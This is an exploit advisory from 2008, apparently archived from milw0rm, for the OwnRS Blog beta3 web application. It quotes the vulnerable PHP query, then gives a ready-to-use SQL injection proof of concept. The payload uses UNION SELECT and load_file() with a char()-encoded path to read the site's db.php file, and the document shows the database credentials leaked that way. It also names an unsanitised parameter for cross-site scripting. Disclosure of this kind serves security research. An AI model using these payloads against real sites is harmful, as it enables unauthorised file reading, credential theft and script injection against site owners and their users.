@@ -1,0 +1,105 @@
+==============================================================
+  OwnRS Blog beta3 (SQL/XSS) Multiple Remote Vulnerabilities
+==============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 19 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : OwnRS
+ VERSION     : Beta3
+ VENDOR	     : N/A
+ DOWNLOAD    : http://downloads.sourceforge.net/ownrs
+#####################################################
+
+--- Remote SQL Injection ---
+
+**magic_quote must turn off**
+
+------------------------------
+ Vulnerable File (clanek.php)
+------------------------------
+
+@ Line 66
+
+[+] $vysledek=mysql_query("select * from clanky where id= '" . $id . "'") or die (mysql_error());
+
+----------
+ Exploit
+----------
+
+[+] http://[Target]/[Ownrs_path]/clanek.php?id=[SQL Injection]
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://localhost/own/clanek.php?id=1'/**/UNION/**/ALL/**/SELECT/**/1,2,load_file(char(67,58,92,120,97,109,112,112,92,104,116,100,111,99,115,92,79,119,110,92,100,98,46,112,104,112)),4,5,6,7,8,9,10/**/FROM/**/autori/**/WHERE/**/id='1
+
+When you view source, You can see
+
+@Line 87
+
+[+] <h1><a href="clanek.php?id=1'/**/UNION/**/ALL/**/SELECT/**/1,2,load_file(char(67,58,92,120,97,109,112,112,92,104,116,100,111,99,115,92,79,119,110,92,100,98,46,112,104,112)),4,5,6,7,8,9,10/**/FROM/**/autori/**/WHERE/**/id='1"><?php
+[+] $spojeni= mysql_connect(
+[+] //server
+[+] "localhost",
+[+] //login
+[+] "xampp",
+[+] //heslo
+[+] "xampp" );
+[+] //databáze
+[+] mysql_select_db("databaze",$spojeni);
+[+] ?>
+[+] </a></h1>
+[+] 45<p class="right"><strong><a href="index.php?kat=9">
+[+] <div class="cara"><span class="schovat">cara</span></div>
+      
+
+---------------------
+ Exploit Description
+---------------------
+
+    This exploit use load_file() to view source files (load_file() can only use with Mysql5+)
+
+load_file(char(67,58,92,120,97,109,112,112,92,104,116,100,111,99,115,92,79,119,110,92,100,98,46,112,104,112))
+will open C:\xampp\htdocs\Own\db.php
+
+
+--- Remote XSS Exploit ---
+
+------------------------------
+ Vulnerable File (clanek.php)
+------------------------------
+
+@ Line 69
+
+[+] <h1><a href="clanek.php?id=<?echo $id?>"><?echo $zaznam["nadpis"]?></a></h1>
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[Ownrs_path]/clanek.php?id=<XSS>
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-19]
